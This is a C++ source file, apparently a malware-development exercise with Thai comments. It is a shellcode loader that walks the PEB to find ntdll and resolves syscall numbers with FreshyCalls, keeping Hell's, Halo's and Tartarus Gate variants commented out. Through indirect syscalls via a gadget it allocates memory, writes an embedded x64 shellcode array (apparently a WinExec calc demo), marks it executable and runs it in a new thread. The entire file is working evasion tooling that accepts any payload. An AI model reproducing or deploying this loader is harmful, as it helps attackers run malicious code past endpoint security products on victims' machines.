#include "Def.h"
#include "MalModule.h"
#include "IndirectAlgo.h"
#include "Stub.h"

int main() {

	// PEB walking ทาง GS:60
	ULONG_PTR uiNtDllAddr = getNtdllBase();
	if (uiNtDllAddr == 0) {
		cout << "Error! ntdll.dll is not found! " << "Error code: " << GetLastError() << endl;
		return -1;
	}
	else {
		cout << "uiNtDllAddr is at : " << hex << uiNtDllAddr << endl;
	}

	PIMAGE_NT_HEADERS64 pNtHeader = getNtHeader(uiNtDllAddr);
	if (pNtHeader == 0) {
		cout << "Error! pNtHeader is not found! " << "Error code: " << GetLastError() << endl;
		return -1;
	}
	else {
		cout << "pNtHeader is at : " << hex << pNtHeader << endl;
	}

	// หา Export Table เพื่อเตรียมหาเลข SSN
	EXPORT_TABLES ntdllExports = { 0 };
	if (getExportTables(uiNtDllAddr, pNtHeader, &ntdllExports)) {
		cout << "==============================================================================" << endl;
		cout << "\nSuccessfully resolved ntdll export tables!" << endl;
		cout << "Export Directory is at: " << hex << ntdllExports.pExportDir << endl;
		cout << "Address Of Names is at: " << hex << ntdllExports.pExportDir->AddressOfNames << endl;
		cout << "Address Of NameOrdinals is at: " << hex << ntdllExports.pExportDir->AddressOfNameOrdinals << endl;
		cout << "Address Of Functions is at: " << hex << ntdllExports.pExportDir->AddressOfFunctions << endl;
		cout << "Number Of Names is at: " << hex << ntdllExports.pExportDir->NumberOfNames << endl;
	}
	
	// หา Gadget 
	ULONG_PTR pGadget = findGadget(pNtHeader, uiNtDllAddr);
	if (pGadget == 0) {
		cout << "Error! Gadget is not found! " << "Error code: " << GetLastError() << endl;
		return -1;
	}
	else {
		cout << "Gadget number is at: 0x" << hex << pGadget << endl;
	}

	// หาเลข SSN ของ NtAllocateVirtualMemory
	// เมื่อได้เลข SSN แล้ว จะนำไปเขียนลงใน Stub ASM
	const char targetFuncAlloc[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't',
							  'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M',
							  'e', 'm', 'o','r', 'y', 0 };
	//DWORD NtAllocSSN = getHellsGateSSN(uiNtDllAddr, ntdllExports, targetFuncAlloc);
	//DWORD NtAllocSSN = getHalosGateSSN(uiNtDllAddr, ntdllExports, pNtHeader, targetFuncAlloc);
	//DWORD NtAllocSSN = getTartarusGateSSN(uiNtDllAddr, ntdllExports, pNtHeader, targetFuncAlloc);
	DWORD NtAllocSSN = getFreshyCallSSN(uiNtDllAddr, ntdllExports, targetFuncAlloc);
	if (NtAllocSSN == 0) {
		cout << "\nError! SSN number is not found! " << "\nError code: " << GetLastError() << endl;
		return -1;
	}
	else {
		cout << "==============================================================================" << endl;
		cout << "\nSSN Number is: " << hex << NtAllocSSN << endl;
		cout << "Function name of SSN number is: " << targetFuncAlloc << endl;
	}

	// เริ่มการสั่งรัน Indirect syscall
	LPVOID pAddress = nullptr;
	SIZE_T Size = 0x1000;

	NTSTATUS statusAlloc = MyNtAllocateVirtualMemory(
		NtAllocSSN,
		pGadget,
		(HANDLE)-1,
		&pAddress,
		0,
		&Size,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);
	if (statusAlloc == 0) {
		cout << "Indirect Syscall Status: 0x" << hex << statusAlloc << endl;
		cout << "Memory allocated at: 0x" << hex << pAddress << endl;
	}
	else {
		cout << "Error code: " << GetLastError() << endl;
	}

const uint8_t shellcode[] = {
		0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6a, 0x60, 0x5a, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54,
		0x59, 0x48, 0x83, 0xec, 0x28, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76,
		0x10, 0x48, 0xad, 0x48, 0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57, 0x3c, 0x8b, 0x5c, 0x17,
		0x28, 0x8b, 0x74, 0x1f, 0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24, 0x0f, 0xb7, 0x2c, 0x17,
		0x8d, 0x52, 0x02, 0xad, 0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75, 0xef, 0x8b, 0x74, 0x1f,
		0x1c, 0x48, 0x01, 0xfe, 0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff, 0xd7, 0x48, 0x83, 0xc4,
		0x30, 0x5d, 0x5f, 0x5e, 0x5b, 0x5a, 0x59, 0x58, 0xc3
	};

	// uint8_t shellcode[] = {0xc3}; <--- shellcode ทดสอบ

	// หาเลข SSN ของ NtWriteVirtualMemory
	// เมื่อได้เลข SSN แล้ว จะนำไปเขียนลงใน Stub ASM
	char targetFuncWrite[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't'
							, 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
	//DWORD NtWriteSSN = getHalosGateSSN(uiNtDllAddr, ntdllExports, pNtHeader, targetFuncWrite);
	//DWORD NtWriteSSN = getTartarusGateSSN(uiNtDllAddr, ntdllExports, pNtHeader, targetFuncWrite);
	DWORD NtWriteSSN = getFreshyCallSSN(uiNtDllAddr, ntdllExports, targetFuncWrite);
	if (NtWriteSSN == 0) {
	cout << "Error! SSN number is not found! " << "Error code: " << GetLastError() << endl;
	return -1;
	}
	else {
		cout << "==============================================================================" << endl;
		cout << "\nSSN Number is: " << hex << NtWriteSSN << endl;
		cout << "Function name of SSN number is: " << targetFuncWrite << endl;
	}

	NTSTATUS statusWrite = MyNtWriteVirtualMemory(
		NtWriteSSN,
		pGadget,
		(HANDLE)-1,
		pAddress,
		(PVOID)shellcode,
		sizeof(shellcode),
		NULL
	);
	if (statusWrite == 0) {
		cout << "Indirect Syscall Status: 0x" << hex << statusWrite << endl;
		cout << "Memory writed at: 0x" << hex << pAddress << endl;
	}
	else {
		cout << "Error code: " << GetLastError() << endl;
	}

	// หาเลข SSN ของ NtProtectVirtualMemory
	// เมื่อได้เลข SSN แล้ว จะนำไปเขียนลงใน Stub ASM
	char targetFuncProtect[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 
								 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 
								 'm', 'o', 'r', 'y', 0 };
	//DWORD NtProtectSSN = getHalosGateSSN(uiNtDllAddr, ntdllExports, pNtHeader, targetFuncProtect);
	//DWORD NtProtectSSN = getTartarusGateSSN(uiNtDllAddr, ntdllExports, pNtHeader, targetFuncProtect);
	DWORD NtProtectSSN = getFreshyCallSSN(uiNtDllAddr, ntdllExports, targetFuncProtect);
	
	if (NtProtectSSN == 0) {
		cout << "Error! SSN number is not found! " << "Error code: " << GetLastError() << endl;
		return -1;
	}
	else {
		cout << "==============================================================================" << endl;
		cout << "\nSSN Number is: " << hex << NtProtectSSN << endl;
		cout << "Function name of SSN number is: " << targetFuncProtect << endl;
	}

	ULONG oldProtect = { 0 };
	SIZE_T sSize = sizeof(shellcode);

	NTSTATUS statusProtect = MyNtProtectVirtualMemory(
		NtProtectSSN,
		pGadget,
		(HANDLE)-1,
		&pAddress,
		&sSize,
		PAGE_EXECUTE_READ,
		&oldProtect
	);
	if (statusProtect == 0) {
		cout << "Indirect Syscall Status: 0x" << hex << statusProtect << endl;
		cout << "Memory protected at: 0x" << hex << pAddress << endl;
	}
	else {
		cout << "Error code: " << GetLastError() << endl;
	}

	// หาเลข SSN ของ NtCreateThreadEx
	// เมื่อได้เลข SSN แล้ว จะนำไปเขียนลงใน Stub ASM
	char targetFuncCreate[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 
								'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', 0 };
	//DWORD NtCreateSSN = getHalosGateSSN(uiNtDllAddr, ntdllExports, pNtHeader, targetFuncCreate);
	//DWORD NtCreateSSN = getTartarusGateSSN(uiNtDllAddr, ntdllExports, pNtHeader, targetFuncCreate);
	DWORD NtCreateSSN = getFreshyCallSSN(uiNtDllAddr, ntdllExports, targetFuncCreate);
	if (NtCreateSSN == 0) {
		cout << "Error! SSN number is not found! " << "Error code: " << GetLastError() << endl;
		return -1;
	}
	else {
		cout << "==============================================================================" << endl;
		cout << "\nSSN Number is: " << hex << NtCreateSSN << endl;
		cout << "Function name of SSN number is: " << targetFuncCreate << endl;
	}

	HANDLE hThread = NULL;

	NTSTATUS statusCreate = MyNtCreateThreadEx(
		NtCreateSSN,
		pGadget,
		&hThread,
		THREAD_ALL_ACCESS,
		NULL, (HANDLE)-1,
		pAddress,
		NULL, 0, 0, 0, 0,
		NULL
	);
	if (statusCreate == 0) {
		cout << "Indirect Syscall Status: 0x" << hex << statusCreate << endl;
		cout << "Memory protected at: 0x" << hex << pAddress << endl;
	}
	else {
		cout << "Error code: " << GetLastError() << endl;
	}

	WaitForSingleObject(hThread, 10);
	CloseHandle(hThread);

	// หาเลข SSN ของ NtFreeVirtualAlloc
	// เมื่อได้เลข SSN แล้ว จะนำไปเขียนลงใน Stub ASM
	char targetFuncFreeVir[] = { 'N', 't', 'F', 'r', 'e', 'e',
								 'V', 'i', 'r', 't', 'u', 'a', 'l',
								 'M', 'e', 'm', 'o', 'r', 'y', 0 };
	//DWORD NtCreateSSN = getHalosGateSSN(uiNtDllAddr, ntdllExports, pNtHeader, targetFuncCreate);
	//DWORD NtCreateSSN = getTartarusGateSSN(uiNtDllAddr, ntdllExports, pNtHeader, targetFuncCreate);
	DWORD NtFreeSSN = getFreshyCallSSN(uiNtDllAddr, ntdllExports, targetFuncFreeVir);
	if (NtFreeSSN == 0) {
		cout << "Error! SSN number is not found! " << "Error code: " << GetLastError() << endl;
		return -1;
	}
	else {
		cout << "==============================================================================" << endl;
		cout << "\nSSN Number is: " << hex << NtFreeSSN << endl;
		cout << "Function name of SSN number is: " << targetFuncFreeVir << endl;
	}

	NTSTATUS statusFree = MyNtFreeVirtualMemory(
		NtFreeSSN,
		pGadget,
		(HANDLE)-1,
		&pAddress,
		&sSize,
		MEM_RELEASE
	);

	if (statusFree == 0) {
		cout << "Indirect Syscall Status: 0x" << hex << statusFree << endl;
		cout << "Memory Freed at: 0x" << hex << pAddress << endl;
	}
	else {
		cout << "Error code: " << GetLastError() << endl;
	}

	cout << "\nMISSION ACCOMPLISHED!" << endl;

	return 0;
}